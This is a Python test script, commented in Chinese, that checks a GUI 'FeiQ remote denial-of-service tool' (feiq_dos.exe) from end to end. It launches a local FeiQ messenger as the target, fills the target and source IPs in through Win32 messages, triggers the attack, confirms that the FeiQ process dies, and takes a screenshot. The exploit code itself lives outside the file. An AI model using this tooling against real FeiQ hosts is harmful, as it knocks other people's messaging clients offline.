# -*- coding: utf-8 -*-
"""
GUI 工具端到端功能验证
=====================
1) 启动本地飞秋靶机
2) 启动 feiq_dos.exe
3) 通过发消息把目标 IP 填进去、点【开始】
4) 等若干秒后检查飞秋是否被打死
5) 截图 GUI 日志区
"""
import ctypes
import ctypes.wintypes as wt
import os
import subprocess
import sys
import time

_HERE = __file__.rsplit("\\", 1)[0]
_ROOT = os.path.dirname(_HERE)

sys.path.insert(0, os.path.join(_ROOT, "analysis"))
import feiq_memscan as M      # noqa: E402

u32 = ctypes.windll.user32
TOOL = os.path.join(_HERE, "bin", "feiq_dos.exe")
FEIQ = os.path.join(_ROOT, "FeiQ.3.0.0.2.exe")
FNAME = "FeiQ.3.0.0.2.exe"


def find_windows():
    out = []

    def cb(h, l):
        if u32.IsWindowVisible(h):
            n = u32.GetWindowTextLengthW(h)
            if n:
                b = ctypes.create_unicode_buffer(n + 1)
                u32.GetWindowTextW(h, b, n + 1)
                out.append((h, b.value))
        return True

    u32.EnumWindows(ctypes.WINFUNCTYPE(ctypes.c_bool, wt.HWND, wt.LPARAM)(cb), 0)
    return out


def main():
    print("=" * 62)
    print(" GUI 工具端到端功能验证")
    print("=" * 62)

    subprocess.run(["taskkill", "/F", "/IM", FNAME], capture_output=True)
    time.sleep(2)
    subprocess.Popen([FEIQ])
    for _ in range(20):
        time.sleep(0.5)
        if M.find_pid(FNAME):
            break
    time.sleep(9)
    print("[1] 本地飞秋靶机 pid=%s" % M.find_pid(FNAME))

    subprocess.Popen([TOOL])
    time.sleep(3)
    wins = find_windows()
    hwnd = 0
    for h, t in wins:
        if "飞秋远程拒绝服务工具" in t:
            hwnd = h
            break
    if not hwnd:
        print("    ✗ 未找到工具窗口")
        return 1
    print("[2] 工具窗口 0x%X" % hwnd)

    # 找到子控件：按 ID 枚举
    target_ed = u32.GetDlgItem(hwnd, 1001)
    src_ed    = u32.GetDlgItem(hwnd, 1002)
    start_btn = u32.GetDlgItem(hwnd, 1021)
    print("[3] 控件: target=0x%X src=0x%X start=0x%X  (窗口 0x%X)" % (target_ed, src_ed, start_btn, hwnd))

    # 必须设 argtypes，否则 ctypes 不会按宽字符串传参
    u32.SetWindowTextW.argtypes = [wt.HWND, ctypes.c_wchar_p]
    u32.SetWindowTextW.restype = wt.BOOL
    u32.GetWindowTextW.argtypes = [wt.HWND, ctypes.c_wchar_p, ctypes.c_int]
    u32.SetWindowTextW(target_ed, "127.0.0.1")
    u32.SetWindowTextW(src_ed, "127.0.0.9")
    _b = ctypes.create_unicode_buffer(128)
    u32.GetWindowTextW(target_ed, _b, 128)
    print("    读回校验: %r" % _b.value)
    print("    已填入 目标=127.0.0.1  源=127.0.0.9")

    print("[4] 点击【开始】...")
    u32.SendMessageW(start_btn, 0x00F5, 0, 0)      # BM_CLICK
    time.sleep(0.5)
    _c = ctypes.create_unicode_buffer(128)
    u32.GetWindowTextW(target_ed, _c, 128)
    print("    点击后再次读回: %r  len=%d" % (_c.value, len(_c.value)))

    # 等飞秋死亡
    dead = False
    for i in range(40):
        time.sleep(1)
        if not M.find_pid(FNAME):
            dead = True
            print("    ★ 本地飞秋已被打死（第 %d 秒）" % (i + 1))
            break
    if not dead:
        print("    ✗ 40 秒内未打死")

    time.sleep(1.5)
    # 截图
    from PIL import Image

    class BIH(ctypes.Structure):
        _fields_ = [("biSize", wt.DWORD), ("biWidth", ctypes.c_long),
                    ("biHeight", ctypes.c_long), ("biPlanes", wt.WORD),
                    ("biBitCount", wt.WORD), ("biCompression", wt.DWORD),
                    ("biSizeImage", wt.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wt.DWORD),
                    ("biClrImportant", wt.DWORD)]

    g32 = ctypes.windll.gdi32
    rc = wt.RECT()
    u32.GetWindowRect(hwnd, ctypes.byref(rc))
    w, h = rc.right - rc.left, rc.bottom - rc.top
    hdc = u32.GetWindowDC(hwnd)
    mdc = g32.CreateCompatibleDC(hdc)
    bmp = g32.CreateCompatibleBitmap(hdc, w, h)
    g32.SelectObject(mdc, bmp)
    u32.PrintWindow(hwnd, mdc, 0)
    bi = BIH()
    bi.biSize = ctypes.sizeof(BIH)
    bi.biWidth = w
    bi.biHeight = -h
    bi.biPlanes = 1
    bi.biBitCount = 32
    buf = ctypes.create_string_buffer(w * h * 4)
    g32.GetDIBits(mdc, bmp, 0, h, buf, ctypes.byref(bi), 0)
    Image.frombuffer("RGBA", (w, h), buf, "raw", "BGRA", 0, 1).convert("RGB").save(
        os.path.join(_HERE, "gui_running.png"))
    print("[5] 运行中截图已保存 gui_running.png")

    g32.DeleteObject(bmp); g32.DeleteDC(mdc); u32.ReleaseDC(hwnd, hdc)

    print("\n=== 结论 ===")
    print("  %s" % ("GUI 工具端到端可用 ✓" if dead else "GUI 工具未打通 ✗"))
    subprocess.run(["taskkill", "/F", "/IM", "feiq_dos.exe"], capture_output=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
